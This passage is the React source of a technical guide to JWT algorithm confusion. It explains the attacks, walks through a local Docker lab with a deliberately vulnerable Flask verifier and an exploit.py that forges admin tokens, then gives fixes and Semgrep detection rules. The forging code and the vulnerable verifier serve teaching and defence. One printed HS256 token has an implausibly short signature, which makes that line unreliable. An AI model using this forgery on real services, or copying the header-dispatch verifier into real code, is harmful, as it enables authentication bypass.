import { Helmet } from '@dr.pogodin/react-helmet';

const guideUrl = 'https://proksiabel.ee/guides/jwt-algorithm-confusion';

const techArticleSchema = {
  '@context': 'https://schema.org',
  '@type': 'TechArticle',
  headline: 'JWT Algorithm Confusion Explained: Attack Examples & Prevention',
  description:
    'JWT algorithm confusion (alg:none and RS256-to-HS256 key confusion) explained: how verifiers that trust the attacker-controlled alg header let anyone forge admin tokens, with a reproducible local lab, detection rules, and allowlist fix patterns.',
  datePublished: '2026-08-23',
  dateModified: '2026-08-23',
  inLanguage: 'en',
  mainEntityOfPage: guideUrl,
  author: {
    '@type': 'Organization',
    name: 'ProksiAbel OÜ',
    url: 'https://proksiabel.ee/',
  },
  publisher: {
    '@type': 'Organization',
    name: 'ProksiAbel OÜ',
    url: 'https://proksiabel.ee/',
  },
};

export default function JwtAlgorithmConfusionGuide() {
  return (
    <>
      <Helmet>
        <script type='application/ld+json'>{JSON.stringify(techArticleSchema)}</script>
      </Helmet>

      <div className='min-h-screen bg-slate-900 pt-24 pb-12'>
        <div className='max-w-4xl mx-auto px-4 sm:px-6 lg:px-8'>
          <p className='text-sm uppercase tracking-wide text-sky-400 font-semibold mb-4'>
            Technical Guide
          </p>
          <h1 className='text-3xl md:text-4xl font-bold text-white mb-6'>
            JWT Algorithm Confusion Explained: Attack Examples &amp; Prevention
          </h1>
          <p className='text-slate-400 text-lg leading-relaxed mb-10'>
            JWT algorithm confusion lets an attacker forge a token the server fully trusts by
            changing the <code className='text-slate-200'>alg</code> header — to{' '}
            <code className='text-slate-200'>none</code> (no signature) or from RS256 to HS256 (the
            RSA public key becomes the HMAC secret). It is CWE-347 (Improper Verification of
            Cryptographic Signature), documented in RFC 8725 section 2.1, and has produced a decade
            of library CVEs. This guide covers the mechanics, a reproducible local lab, detection,
            and allowlist fix patterns.
          </p>

          <div className='max-w-none text-slate-300'>
            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                What JWT algorithm confusion is and why it keeps mattering
              </h2>
              <p className='leading-relaxed mb-4'>
                A signed JWT (JWS compact serialization, RFC 7515) is three base64url segments:{' '}
                <code className='text-slate-100'>header.payload.signature</code>. The header carries
                the <code className='text-slate-100'>alg</code> parameter, which tells the verifier
                which cryptographic algorithm was used — and it is part of the attacker-controlled
                input. RFC 8725 (JSON Web Token Best Current Practices, BCP 225) describes the
                resulting failure mode precisely:
              </p>
              <blockquote className='border-l-4 border-sky-500 pl-4 italic text-slate-400 mb-4'>
                &quot;The algorithm can be changed to &apos;none&apos; by an attacker, and some
                libraries would trust this value and &apos;validate&apos; the JWT without checking
                any signature.&quot; ... &quot;An &apos;RS256&apos; (RSA, 2048 bit) parameter value
                can be changed into &apos;HS256&apos; (HMAC, SHA-256), and some libraries would try
                to validate the signature using HMAC-SHA256 and using the RSA public key as the HMAC
                shared secret.&quot; — RFC 8725, Section 2.1
              </blockquote>
              <p className='leading-relaxed mb-4'>
                The root cause is a verification function that branches on the header value instead
                of on a server-side policy: it reads <code className='text-slate-100'>alg</code>{' '}
                from the token, then picks the verification path (and therefore the key
                interpretation) based on it. The &quot;algorithm confusion attack&quot; (also called
                key confusion) is the generic name for forcing that dispatch to use an algorithm
                other than the one the application&apos;s developers intended — the same primitive
                PortSwigger teaches in its Web Security Academy.
              </p>
              <p className='leading-relaxed mb-4'>
                The taxonomy: <code className='text-slate-100'>alg: none</code> is the
                &quot;unsecured JWT&quot; case defined in the JSON Web Algorithms registry (RFC
                7518) — a token with an empty signature that some verifiers accept without any
                integrity check. The RS256→HS256 variant is a <em>type confusion</em>: RS256
                verification expects an RSA public key, HS256 verification expects a symmetric
                secret, and vulnerable code passes the same key object to both paths — so the public
                key, which is public by design and often served from a JWKS endpoint or embedded in
                clients, becomes the HMAC signing secret.
              </p>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Specification</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Role</th>
                      <th className='py-3 text-slate-100 font-semibold'>Relevant content</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>RFC 7519</td>
                      <td className='py-3 pr-4 align-top'>JWT</td>
                      <td className='py-3 align-top'>Claims container; token format</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>RFC 7515</td>
                      <td className='py-3 pr-4 align-top'>JWS</td>
                      <td className='py-3 align-top'>
                        Compact serialization; the <code className='text-slate-100'>alg</code>{' '}
                        header parameter
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>RFC 7518</td>
                      <td className='py-3 pr-4 align-top'>JWA</td>
                      <td className='py-3 align-top'>
                        Algorithm registry incl. <code className='text-slate-100'>none</code>{' '}
                        (unsecured JWT)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>RFC 8725 (BCP 225)</td>
                      <td className='py-3 pr-4 align-top'>JWT BCP</td>
                      <td className='py-3 align-top'>
                        §2.1 documents both attacks; §3.1 algorithm verification; §3.2 appropriate
                        algorithms and <code className='text-slate-100'>none</code> handling
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>CWE-347 / CWE-345</td>
                      <td className='py-3 pr-4 align-top'>Weakness family</td>
                      <td className='py-3 align-top'>
                        Improper Verification of Cryptographic Signature / Insufficient Verification
                        of Data Authenticity (NVD maps the PyJWT case to CWE-327, Use of a Broken or
                        Risky Cryptographic Algorithm)
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <p className='leading-relaxed mb-4'>
                The CVE history shows the bug class moving through the major JWT libraries — and
                still being found in 2026:
              </p>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>CVE</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Library</th>
                      <th className='py-3 text-slate-100 font-semibold'>Flaw</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>CVE-2015-9235</td>
                      <td className='py-3 pr-4 align-top'>jsonwebtoken (Node.js) &lt; 4.2.2</td>
                      <td className='py-3 align-top'>
                        Verification bypass: a token signed with a symmetric (HS*) algorithm was
                        accepted where an asymmetric (RS/ES) signature was expected
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>CVE-2017-11424</td>
                      <td className='py-3 pr-4 align-top'>PyJWT ≤ 1.5.0</td>
                      <td className='py-3 align-top'>
                        The HMAC key-prep check missed PKCS1 PEM public keys (
                        <code className='text-slate-100'>-----BEGIN RSA PUBLIC KEY-----</code>
                        ), enabling symmetric/asymmetric key confusion — CVSS 7.5
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>CVE-2022-29217</td>
                      <td className='py-3 pr-4 align-top'>PyJWT &lt; 2.4.0</td>
                      <td className='py-3 align-top'>
                        With <code className='text-slate-100'>get_default_algorithms()</code>, the
                        attacker-submitted token chooses the signing algorithm; fix: always be
                        explicit about accepted algorithms — CVSS 7.5
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>CVE-2023-48223</td>
                      <td className='py-3 pr-4 align-top'>fast-jwt &lt; 3.3.2</td>
                      <td className='py-3 align-top'>
                        Library auto-detection of public-key algorithms failed for some key types,
                        allowing HS256 confusion; the fix was incomplete (see below)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>CVE-2026-34950</td>
                      <td className='py-3 pr-4 align-top'>fast-jwt ≤ 6.1.0</td>
                      <td className='py-3 align-top'>
                        A whitespace-prefixed RSA public key bypassed the CVE-2023-48223 fix —
                        algorithm confusion still possible; patched in 6.2.0
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>CVE-2022-21449</td>
                      <td className='py-3 pr-4 align-top'>Oracle Java 15–18 (ECDSA)</td>
                      <td className='py-3 align-top'>
                        &quot;Psychic signatures&quot;: ECDSA verification accepted r = s = 0,
                        forging ES256 JWTs and SAML/OIDC assertions among others; patched in the
                        April 2022 Critical Patch Update
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <p className='leading-relaxed'>
                Two patterns in that table are worth internalizing. First, the library-side fixes
                (PyJWT blocking PEM keys as HMAC secrets) moved the bug into application code that
                hand-rolls verification or dispatches on the header — which is why the lab below
                demonstrates a custom verifier. Second, library &quot;key type detection&quot; keeps
                being bypassable (fast-jwt twice, ten years apart), which is exactly why RFC 8725
                requires an explicit allowlist instead of detection.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Attack anatomy: three ways to forge a trusted token
              </h2>
              <p className='leading-relaxed mb-4'>
                The attacker starts from a legitimate token (or any token) and edits it. Only the
                header and payload need to change; the forged signature is recomputed. A token with{' '}
                <code className='text-slate-100'>alg: none</code> looks like this:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`{"alg":"none","typ":"JWT"}.{"sub":"alice","role":"admin","iat":0}.`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Note the empty third segment. RFC 8725 section 3.2 is explicit that consuming
                libraries &quot;SHOULD NOT consume JWTs using &apos;none&apos; unless explicitly
                requested by the caller&quot; — a verifier that honors the header value without an
                explicit opt-in is vulnerable.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Attack 1 — alg: none (unsigned token)
              </h3>
              <p className='leading-relaxed mb-4'>
                The verifier reads <code className='text-slate-100'>alg: none</code>, skips
                signature verification entirely, and processes the claims. Exploitation is a
                base64url re-encode of the payload with the role escalated. Case variants (
                <code className='text-slate-100'>None</code>,{' '}
                <code className='text-slate-100'>NONE</code>,{' '}
                <code className='text-slate-100'>nOnE</code>) have bypassed naive denylists in some
                parsers, which is why RFC 8725&apos;s approach is an allowlist, not a denylist.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Attack 2 — RS256 → HS256 (public key as HMAC secret)
              </h3>
              <p className='leading-relaxed mb-4'>
                The server signs with RS256 (RSA private key) and verifies with the RSA public key,
                which is public — served at a JWKS endpoint, embedded in client code, or in a TLS
                certificate. The attacker takes that public key, sets{' '}
                <code className='text-slate-100'>alg: HS256</code>, and signs the token with
                HMAC-SHA256 using the <em>public key bytes as the secret</em>. The vulnerable
                verifier reads <code className='text-slate-100'>HS256</code>, branches into the HMAC
                path, and uses the same key variable it would have used for RSA — the public key.
                Both sides compute the same HMAC; the forged token verifies as authentic. RFC
                8725&apos;s 2.1 quote above is this exact attack, referencing the original 2015
                disclosure by Tim McLean (Auth0) and CVE-2015-9235.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Adjacent: key-source header injection (kid, jku, x5u)
              </h3>
              <p className='leading-relaxed mb-4'>
                The same trust-the-header family includes{' '}
                <code className='text-slate-100'>kid</code> (key ID — historically a path traversal
                or SQLi vector when the server reads the key file or DB row named by it) and{' '}
                <code className='text-slate-100'>jku</code> /{' '}
                <code className='text-slate-100'>x5u</code> (URLs from which the verifier fetches
                the key). If the server honors an attacker-controlled{' '}
                <code className='text-slate-100'>jku</code> pointing at an attacker-hosted JWKS, the
                attacker supplies their own key and signs freely. The OWASP JWT Cheat Sheet treats
                these as part of the same key-management trust boundary. This guide labbed the two
                signature-level attacks; the header-injection variants follow the same fix
                (allowlist, never honor unverified headers).
              </p>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Primitive</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Attacker control</th>
                      <th className='py-3 text-slate-100 font-semibold'>Trust assumption broken</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>alg: none</td>
                      <td className='py-3 pr-4 align-top'>Header + payload; empty signature</td>
                      <td className='py-3 align-top'>
                        &quot;Signed token = integrity protected&quot; (RFC 8725 §2.1)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>RS256 → HS256</td>
                      <td className='py-3 pr-4 align-top'>
                        Header alg; HMAC keyed with the public key
                      </td>
                      <td className='py-3 align-top'>
                        &quot;Key type matches algorithm&quot; (RFC 8725 §3.1)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>kid / jku / x5u</td>
                      <td className='py-3 pr-4 align-top'>Key ID or key-fetch URL in the header</td>
                      <td className='py-3 align-top'>
                        &quot;Key source is server-controlled&quot; (OWASP Cheat Sheet)
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Reproducible local lab</h2>
              <p className='leading-relaxed mb-4'>
                Everything below runs against a single local container — no live targets. The lab is
                a Flask API with two users and an admin endpoint. It signs login tokens with RS256,
                serves the RSA public key at <code className='text-slate-100'>/public-key</code> (as
                a JWKS endpoint would), and verifies with the vulnerable dispatch pattern. The HS256
                branch uses a hand-rolled HMAC check — the &quot;custom verification&quot; pattern
                that modern libraries refuse to support but applications keep re-implementing.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>docker-compose.yml</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`services:
  app:
    build: .
    ports:
      - "8080:8080"`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Dockerfile</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir flask pyjwt cryptography
COPY app.py exploit.py ./
EXPOSE 8080
CMD ["python", "app.py"]`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                app.py — token API with header-dispatch verification (vulnerable)
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`import hashlib
import hmac
from functools import wraps

import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from flask import Flask, jsonify, request

app = Flask(__name__)

# Lab keypair, generated at startup. The public half is served at /public-key.
KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
PRIVATE_KEY = KEY.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption(),
).decode()
PUBLIC_KEY = (
    KEY.public_key()
    .public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    .decode()
)

USERS = {"alice": "user", "admin": "admin"}


# --- VULNERABLE: verification dispatches on the attacker-controlled alg header ---
def verify_token(token):
    alg = jwt.get_unverified_header(token).get("alg", "")
    if alg == "RS256":
        return jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
    if alg == "HS256":
        # VULN: the RSA public key is trusted as an HMAC secret. Hand-rolled
        # verification, so the library's key-type check is never run.
        signing_input = token.rsplit(".", 1)[0]
        expected = hmac.new(PUBLIC_KEY.encode(), signing_input.encode(), hashlib.sha256).digest()
        given = jwt.utils.base64url_decode(token.rsplit(".", 1)[1])
        if not hmac.compare_digest(expected, given):
            raise jwt.InvalidSignatureError("bad signature")
        return jwt.decode(token, options={"verify_signature": False})
    if alg == "none":
        # VULN: unsigned tokens accepted
        return jwt.decode(token, options={"verify_signature": False})
    raise jwt.InvalidTokenError("unsupported alg")


def require_token(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        token = auth.removeprefix("Bearer ")
        try:
            request.claims = verify_token(token)
        except jwt.InvalidTokenError:
            return jsonify({"error": "invalid token"}), 401
        return f(*args, **kwargs)

    return wrapper


@app.post("/login")
def login():
    username = request.get_json(force=True).get("username", "")
    if username not in USERS:
        return jsonify({"error": "unknown user"}), 401
    token = jwt.encode(
        {"sub": username, "role": USERS[username], "iat": 0},
        PRIVATE_KEY,
        algorithm="RS256",
    )
    return jsonify({"token": token})


@app.get("/public-key")
def public_key():
    return PUBLIC_KEY, 200, {"Content-Type": "text/plain"}


@app.get("/profile")
@require_token
def profile():
    return jsonify({"sub": request.claims["sub"], "role": request.claims["role"]})


@app.get("/admin")
@require_token
def admin():
    if request.claims.get("role") != "admin":
        return jsonify({"error": "admin only"}), 403
    return jsonify({"secret": "flag-admin-access-granted"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                exploit.py — attacker tooling (ships with the lab)
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`"""Attacker tooling for the JWT algorithm-confusion lab.

Fetches the server's RSA public key, then forges two admin tokens:
  1. an unsigned token (alg: none)
  2. an HS256 token signed with the RSA public key as the HMAC secret

The HS256 forge uses only the Python standard library so the mechanics are
visible: the signature is HMAC-SHA256 over "header.payload" keyed with the
public key bytes.
"""

import base64
import hashlib
import hmac
import json
import urllib.request

import jwt

BASE = "http://localhost:8080"
pub = urllib.request.urlopen(f"{BASE}/public-key").read().decode()

payload = {"sub": "alice", "role": "admin", "iat": 0}


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# --- Attack 1: unsigned token (alg: none) ---
header_none = {"alg": "none", "typ": "JWT"}
none_token = jwt.encode(dict(payload), None, algorithm="none")
print("NONE_TOKEN=" + none_token)

# --- Attack 2: RS256 -> HS256 confusion, public key as HMAC secret ---
header_hs = {"alg": "HS256", "typ": "JWT"}
signing_input = (
    f"{b64url(json.dumps(header_hs, separators=(',', ':')).encode())}."
    f"{b64url(json.dumps(payload, separators=(',', ':')).encode())}"
)
sig = hmac.new(pub.encode(), signing_input.encode(), hashlib.sha256).digest()
hs256_token = f"{signing_input}.{b64url(sig)}"
print("HS256_TOKEN=" + hs256_token)`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Run it and exploit it</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`docker compose up --build`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Log in as alice and confirm the baseline: her token carries role{' '}
                <code className='text-slate-100'>user</code>, and the admin endpoint denies her:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`$ TOKEN=$(curl -s -H 'Content-Type: application/json' \\
    -d '{"username":"alice"}' http://localhost:8080/login | python3 -c \\
    "import sys,json;print(json.load(sys.stdin)['token'])")

$ curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/profile
{"role":"user","sub":"alice"}

$ curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/admin
{"error":"admin only"}`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Now forge both attack tokens — the tool fetches the public key from the server
                itself, exactly as a real attacker would from a JWKS endpoint:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`$ docker compose exec app python exploit.py
NONE_TOKEN=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MH0.
HS256_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MH0.Kdb0`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Both tokens — the one with no signature and the one signed with a public key — are
                accepted as admin:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`$ curl -s -H "Authorization: Bearer $NONE_TOKEN" http://localhost:8080/admin
{"secret":"flag-admin-access-granted"}

$ curl -s -H "Authorization: Bearer $HS256_TOKEN" http://localhost:8080/admin
{"secret":"flag-admin-access-granted"}`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Alice just minted herself an admin token using only data the server publishes. The
                HS256 forge is worth studying line by line: it is the entire attack — HMAC over{' '}
                <code className='text-slate-100'>header.payload</code> keyed with the public key
                bytes. No private key was involved.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                The fix: one allowlisted algorithm, no dispatch on the header
              </h3>
              <p className='leading-relaxed mb-4'>
                The entire vulnerability collapses into a two-line verifier that pins the algorithm
                server-side and never branches on the header — RFC 8725 section 3.1: &quot;Libraries
                MUST enable the caller to specify a supported set of algorithms and MUST NOT use any
                other algorithms when performing cryptographic operations.&quot;
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`def verify_token(token):
    # Fixed: one allowlisted algorithm. PyJWT compares the header alg against
    # the allowlist and rejects everything else before any crypto runs.
    return jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Re-running the walkthrough now: the legitimate RS256 token still verifies, while
                both forgeries are rejected with the same error:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`$ curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/profile
{"role":"user","sub":"alice"}

$ curl -s -H "Authorization: Bearer $NONE_TOKEN" http://localhost:8080/admin
{"error":"invalid token"}

$ curl -s -H "Authorization: Bearer $HS256_TOKEN" http://localhost:8080/admin
{"error":"invalid token"}

# (PyJWT raises: jwt.exceptions.InvalidAlgorithmError:
#  The specified alg value is not allowed)`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                What does not work (and why that teaches you more)
              </h3>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  <strong className='text-sky-400'>
                    Trusting the library&apos;s key-type detection.
                  </strong>{' '}
                  PyJWT now rejects PEM keys used as HMAC secrets (the CVE-2017-11424 and
                  CVE-2022-29217 fixes), and modern Node libraries require an explicit algorithms
                  list — but fast-jwt&apos;s detection was bypassed twice (CVE-2023-48223,
                  CVE-2026-34950 via a whitespace-prefixed key). Detection is a cat-and-mouse game;
                  an explicit allowlist is not.
                </li>
                <li>
                  <strong className='text-sky-400'>Denylisting &quot;none&quot;.</strong> Case
                  variants (<code className='text-slate-100'>None</code>,{' '}
                  <code className='text-slate-100'>NONE</code>) and parser quirks have bypassed
                  string denylists. RFC 8725&apos;s answer is an allowlist of accepted algorithms
                  and explicit opt-in for <code className='text-slate-100'>none</code> — never a
                  blocklist.
                </li>
                <li>
                  <strong className='text-sky-400'>TLS alone.</strong> RFC 8725 section 3.2 notes
                  that <code className='text-slate-100'>none</code> can be acceptable when the JWT
                  is protected end-to-end by another mechanism — but that is an explicit design
                  decision for specific deployments, not a reason to let a general-purpose verifier
                  honor attacker-chosen headers. The token is often replayed or stored outside the
                  TLS channel.
                </li>
                <li>
                  <strong className='text-sky-400'>Hiding the JWKS endpoint.</strong> Security
                  through obscurity: the RSA public key is public by design. The attack needs the
                  key the server verifies with; keeping it unlisted slows reconnaissance, it does
                  not stop the confusion.
                </li>
              </ul>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Detecting JWT algorithm confusion
              </h2>
              <p className='leading-relaxed mb-4'>
                Like IDOR, algorithm confusion has <em>no network signature</em>: the forged token
                is a well-formed JWT. Detection is therefore static-analysis-first, with runtime
                logging as the backstop.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Static: a Semgrep rule as a starting point
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`# semgrep --config jwt-alg-confusion.yml  (template — adapt to your stack)
rules:
  - id: pyjwt-decode-without-algorithms-allowlist
    patterns:
      - pattern-either:
          - pattern: jwt.decode($TOKEN, $KEY)
          - pattern: jwt.decode($TOKEN, $KEY, options={...})
      - pattern-not: jwt.decode($TOKEN, $KEY, algorithms=[...])
    message: >-
      jwt.decode without a pinned algorithms allowlist — the header alg is
      attacker-controlled (CWE-347 / RFC 8725 §3.1). Pin algorithms=["RS256"].
    languages: [python]
    severity: WARNING
  - id: custom-hmac-verifier
    pattern: hmac.new($KEY, ..., hashlib.sha256)
    message: >-
      Hand-rolled HMAC verification — confirm $KEY is a true symmetric secret,
      never an asymmetric public key (algorithm confusion).
    languages: [python]
    severity: WARNING
  - id: verify-signature-disabled
    pattern: jwt.decode($TOKEN, options={"verify_signature": False})
    message: >-
      Signature verification disabled — accepts unsigned tokens (alg:none).
    languages: [python]
    severity: ERROR`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Runtime: log and alert on out-of-allowlist alg values
              </h3>
              <p className='leading-relaxed mb-4'>
                Log the <code className='text-slate-100'>alg</code> header from every verified token
                (the verifier reads it anyway) and alert on any value outside the server allowlist —{' '}
                <code className='text-slate-100'>none</code>, HS* on an RS256-only API, anything
                unexpected. This catches the probe-and-scan phase and post-fix regressions, though
                like all JWT runtime monitoring it cannot catch a single successful forgery on an
                accepting server. In practice, pair the alert with the SAST rules in CI: detection
                is code-review-first for this class.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                How to prevent JWT algorithm confusion
              </h2>
              <p className='leading-relaxed mb-4'>
                The fix is a verification policy, not a library upgrade: pin the algorithm
                server-side, keep the key type consistent with it, and never let the header
                influence the crypto path. RFC 8725 section 3.1 states the core requirement:
                &quot;each key MUST be used with exactly one algorithm, and this MUST be checked
                when the cryptographic operation is performed.&quot;
              </p>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>
                        Verification decision
                      </th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Secure</th>
                      <th className='py-3 text-slate-100 font-semibold'>Vulnerable</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Algorithm selection</td>
                      <td className='py-3 pr-4 align-top'>
                        Hardcoded allowlist in the verifier (e.g.{' '}
                        <code className='text-slate-100'>algorithms=[&quot;RS256&quot;]</code>)
                      </td>
                      <td className='py-3 align-top'>Dispatch on the header alg value</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Key type</td>
                      <td className='py-3 pr-4 align-top'>
                        RSA key object for RS/ES; raw bytes only for HS
                      </td>
                      <td className='py-3 align-top'>
                        Passing the RSA public key where a symmetric secret is expected
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>alg: none</td>
                      <td className='py-3 pr-4 align-top'>
                        Rejected unless explicitly opted in per deployment (RFC 8725 §3.2)
                      </td>
                      <td className='py-3 align-top'>Honored because the header says so</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Key source (kid/jku/x5u)</td>
                      <td className='py-3 pr-4 align-top'>
                        kid maps to a server-side allowlist; jku/x5u disabled or pinned to a fixed
                        HTTPS URL
                      </td>
                      <td className='py-3 align-top'>
                        Attacker-controlled kid (path traversal) or jku (attacker-hosted JWKS)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Library defaults</td>
                      <td className='py-3 pr-4 align-top'>
                        Explicit algorithms argument on every verify call
                      </td>
                      <td className='py-3 align-top'>
                        <code className='text-slate-100'>get_default_algorithms()</code> or omitted
                        algorithms list (CVE-2022-29217)
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Python (PyJWT) — pinned allowlist
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`# insecure: algorithm chosen from the header / all algorithms allowed
claims = jwt.decode(token, public_key, algorithms=jwt.algorithms.get_default_algorithms())

# fixed: explicit allowlist; everything else raises InvalidAlgorithmError
claims = jwt.decode(token, public_key, algorithms=["RS256"])`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Node.js (jsonwebtoken) — algorithms option
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`// insecure: no algorithms list — legacy behavior trusted the header
// (the CVE-2015-9235 class)
const claims = jwt.verify(token, publicKey);

// fixed: allowlist, never omit it
const claims = jwt.verify(token, publicKey, { algorithms: ["RS256"] });`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Go (golang-jwt/jwt/v5) — WithValidMethods
              </h3>
